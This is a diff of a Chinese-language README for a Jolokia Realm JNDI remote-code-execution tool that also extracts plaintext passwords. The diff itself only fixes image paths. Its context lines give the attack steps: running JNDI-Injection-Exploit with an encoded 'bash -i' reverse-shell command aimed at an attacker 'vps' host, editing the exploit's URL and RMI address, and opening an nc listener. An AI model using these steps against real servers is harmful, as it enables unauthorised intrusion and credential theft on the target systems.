@@ -2,7 +2,7 @@
 
 jolokia Realm JNDI RCE 漏洞检测，并获取明文密码
 
-![image-20230529125021273](\image\img.png)
+![img](image/img.png)g
 
 
 
@@ -14,19 +14,19 @@ jolokia Realm JNDI RCE 漏洞检测，并获取明文密码
 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,base64}|{base64,-d}|{bash,-i}" -A "vps"
 ```
 
-![img1](\image\img1.png)
+![img1](image/img1.png)
 
 
 
 修改 expliot 中的 url 和 rmi 地址
 
-![img2](\image\img2.png)
+![img2](image/img2.png)
 
 
 
 nc 监听端口
 
-![img3](\image\img3.png)
+![img3](image/img3.png)
 
 
 
